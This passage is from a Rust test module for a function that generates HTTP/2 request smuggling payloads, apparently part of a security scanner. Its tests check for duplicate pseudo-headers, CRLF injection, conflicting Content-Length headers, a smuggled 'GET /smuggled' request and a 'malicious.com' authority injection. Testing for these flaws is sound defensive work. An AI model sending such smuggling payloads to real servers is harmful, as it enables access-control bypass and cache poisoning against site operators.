        assert!(!payloads.is_empty(), "H2 payloads should not be empty");

        // Should have multiple variations for different HTTP/2 attack vectors
        assert!(
            payloads.len() >= 25,
            "Expected at least 25 H2 payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_h2_basic_payload_structure() {
        let payloads = get_h2_payloads("/test", "example.com", "GET", &[], &[]);

        // All payloads should be valid HTTP/1.1 requests (since we're testing HTTP/2->HTTP/1.1 translation)
        for payload in &payloads {
            assert!(
                payload.starts_with("GET /test HTTP/1.1"),
                "Should start with correct request line"
            );
            assert!(payload.contains("Host: example.com"), "Missing Host header");
        }
    }

    #[test]
    fn test_h2_pseudo_header_attacks() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // Check for duplicate :method pseudo-header
        let has_duplicate_method = payloads.iter().any(|p| p.matches(":method:").count() >= 2);
        assert!(has_duplicate_method, "Missing duplicate :method attack");

        // Check for duplicate :path pseudo-header
        let has_duplicate_path = payloads.iter().any(|p| p.matches(":path:").count() >= 2);
        assert!(has_duplicate_path, "Missing duplicate :path attack");

        // Check for duplicate :authority pseudo-header
        let has_duplicate_authority = payloads
            .iter()
            .any(|p| p.matches(":authority:").count() >= 2);
        assert!(
            has_duplicate_authority,
            "Missing duplicate :authority attack"
        );

        // Check for duplicate :scheme pseudo-header
        let has_duplicate_scheme = payloads.iter().any(|p| p.matches(":scheme:").count() >= 2);
        assert!(has_duplicate_scheme, "Missing duplicate :scheme attack");
    }

    #[test]
    fn test_h2_header_name_with_colon() {
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &[]);

        // Check for custom pseudo-header (header name starting with colon)
        let has_custom_pseudo = payloads.iter().any(|p| p.contains(":custom-header:"));
        assert!(has_custom_pseudo, "Missing custom pseudo-header attack");

        // Check for header name with colon in the middle
        let has_colon_middle = payloads.iter().any(|p| p.contains("x-custom:header:"));
        assert!(has_colon_middle, "Missing header with colon in middle");
    }

    #[test]
    fn test_h2_content_length_conflicts() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // Check for Content-Length: 0 with smuggled request
        let has_cl_zero_with_body = payloads
            .iter()
            .any(|p| p.contains("Content-Length: 0") && p.contains("GET /smuggled HTTP/1.1"));
        assert!(
            has_cl_zero_with_body,
            "Missing Content-Length: 0 with smuggled request"
        );

        // Check for multiple Content-Length headers
        let has_multiple_cl = payloads
            .iter()
            .any(|p| p.matches("Content-Length:").count() >= 2);
        assert!(has_multiple_cl, "Missing multiple Content-Length headers");
    }

    #[test]
    fn test_h2_header_value_newline_injection() {
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &[]);

        // Check for header value with newline
        let has_newline = payloads
            .iter()
            .any(|p| p.contains("X-Custom: value1\nX-Injected:"));
        assert!(has_newline, "Missing header value with newline injection");

        // Check for header value with CRLF
        let has_crlf = payloads
            .iter()
            .any(|p| p.contains("X-Custom: value1\r\nX-Injected:"));
        assert!(has_crlf, "Missing header value with CRLF injection");
    }

    #[test]
    fn test_h2_forbidden_transfer_encoding() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // HTTP/2 forbids Transfer-Encoding, check if we test this
        let has_te = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked"));
        assert!(has_te, "Missing Transfer-Encoding in HTTP/2 context");
    }

    #[test]
    fn test_h2_forbidden_connection_headers() {
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &[]);

        // Check for Connection header (forbidden in HTTP/2)
        let has_connection = payloads.iter().any(|p| p.contains("Connection: close"));
        assert!(has_connection, "Missing Connection header attack");

        // Check for Keep-Alive header (forbidden in HTTP/2)
        let has_keep_alive = payloads.iter().any(|p| p.contains("Keep-Alive:"));
        assert!(has_keep_alive, "Missing Keep-Alive header attack");

        // Check for Proxy-Connection header (forbidden in HTTP/2)
        let has_proxy_connection = payloads.iter().any(|p| p.contains("Proxy-Connection:"));
        assert!(
            has_proxy_connection,
            "Missing Proxy-Connection header attack"
        );
    }

    #[test]
    fn test_h2_case_sensitivity_attacks() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // HTTP/2 requires lowercase pseudo-headers, check for mixed-case
        let has_mixed_case = payloads
            .iter()
            .any(|p| p.contains(":Method:") || p.contains(":PATH:"));
        assert!(has_mixed_case, "Missing case sensitivity attack");
    }

    #[test]
    fn test_h2_header_ordering_attacks() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // Check for regular header before pseudo-header (violates HTTP/2 spec)
        let has_wrong_order = payloads.iter().any(|p| {
            // Find positions of regular header and pseudo-header
            let lines: Vec<&str> = p.split("\r\n").collect();
            let mut found_regular = false;
            let mut found_pseudo_after = false;

            for line in lines {
                if line.starts_with("X-Custom:") {
                    found_regular = true;
                } else if found_regular && line.starts_with(":method:") {
                    found_pseudo_after = true;
                    break;
                }
            }

            found_pseudo_after
        });
        assert!(has_wrong_order, "Missing header ordering attack");
    }

    #[test]
    fn test_h2_header_name_validation() {
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &[]);

        // Check for underscore in header name
        let has_underscore = payloads.iter().any(|p| p.contains("x_custom_header:"));
        assert!(has_underscore, "Missing underscore in header name");
    }

    #[test]
    fn test_h2_content_length_zero_with_body() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // Check for Content-Length: 0 with actual body content
        let has_cl_zero_body = payloads
            .iter()
            .any(|p| p.contains("Content-Length: 0") && p.contains("unexpected body content"));
        assert!(has_cl_zero_body, "Missing Content-Length: 0 with body");
    }

    #[test]
    fn test_h2_downgrade_attack() {
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &[]);

        // Check for HTTP/2 downgrade with smuggled request
        let has_downgrade = payloads
            .iter()
            .any(|p| p.contains("HTTP2-Settings:") && p.contains("Transfer-Encoding: chunked"));
        assert!(has_downgrade, "Missing HTTP/2 downgrade attack");
    }

    #[test]
    fn test_h2_request_splitting() {
        let payloads = get_h2_payloads("/", "test.com", "POST", &[], &[]);

        // Check for request splitting via header injection
        let has_splitting = payloads
            .iter()
            .any(|p| p.contains("GET /smuggled HTTP/1.1"));
        assert!(has_splitting, "Missing request splitting attack");
    }

    #[test]
    fn test_h2_with_custom_headers() {
        let custom_headers = vec![
            "X-API-Key: secret".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        let payloads = get_h2_payloads("/api", "test.com", "POST", &custom_headers, &[]);

        for payload in &payloads {
            assert!(
                payload.contains("X-API-Key: secret"),
                "Missing custom header"
            );
            assert!(
                payload.contains("Authorization: Bearer token"),
                "Missing auth header"
            );
        }
    }

    #[test]
    fn test_h2_with_cookies() {
        let cookies = vec!["session=abc123".to_string(), "user=test".to_string()];
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &cookies);

        for payload in &payloads {
            assert!(
                payload.contains("Cookie: session=abc123; user=test"),
                "Missing cookie header"
            );
        }
    }

    #[test]
    fn test_h2_different_methods() {
        let methods = vec!["GET", "POST", "PUT", "DELETE", "PATCH"];

        for method in methods {
            let payloads = get_h2_payloads("/api", "test.com", method, &[], &[]);
            for payload in &payloads {
                assert!(
                    payload.starts_with(&format!("{} /api HTTP/1.1", method)),
                    "Method {} not properly set",
                    method
                );
            }
        }
    }

    #[test]
    fn test_h2_different_paths() {
        let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];

        for path in paths {
            let payloads = get_h2_payloads(path, "test.com", "GET", &[], &[]);
            for payload in &payloads {
                assert!(
                    payload.contains(&format!("GET {} HTTP/1.1", path)),
                    "Path {} not properly set",
                    path
                );
            }
        }
    }

    #[test]
    fn test_h2_http_compliance() {
        let payloads = get_h2_payloads("/test", "example.com", "GET", &[], &[]);

        for payload in &payloads {
            // Each line should end with \r\n (HTTP spec)
            let lines: Vec<&str> = payload.split("\r\n").collect();

            // Should have HTTP version in first line
            assert!(
                lines[0].contains("HTTP/1.1"),
                "Missing HTTP/1.1 in request line"
            );

            // Should have proper header format
            let has_host = lines.iter().any(|line| line.starts_with("Host:"));
            assert!(has_host, "Missing Host header");
        }
    }

    #[test]
    fn test_h2_pseudo_header_values() {
        let payloads = get_h2_payloads("/test", "example.com", "POST", &[], &[]);

        // Verify specific pseudo-header values are present
        let has_admin_path = payloads.iter().any(|p| p.contains(":path: /admin"));
        assert!(has_admin_path, "Should have :path: /admin injection");

        let has_malicious_authority = payloads
            .iter()
            .any(|p| p.contains(":authority: malicious.com"));
        assert!(
            has_malicious_authority,
            "Should have :authority: malicious.com injection"
        );
    }

    #[test]
    fn test_h2_payload_count_by_category() {
        let payloads = get_h2_payloads("/", "test.com", "GET", &[], &[]);

        // Count different attack categories
        let pseudo_header_attacks = payloads
            .iter()
            .filter(|p| {
                p.matches(":method:").count() >= 2
                    || p.matches(":path:").count() >= 2
                    || p.matches(":authority:").count() >= 2
                    || p.matches(":scheme:").count() >= 2
            })
            .count();
        assert!(
            pseudo_header_attacks >= 4,
            "Should have at least 4 pseudo-header attacks"
        );

        let forbidden_header_attacks = payloads
            .iter()
            .filter(|p| {
                p.contains("Connection:")
                    || p.contains("Keep-Alive:")
                    || p.contains("Proxy-Connection:")
            })
            .count();
        assert!(
            forbidden_header_attacks >= 3,
            "Should have at least 3 forbidden header attacks"
        );
    }
}
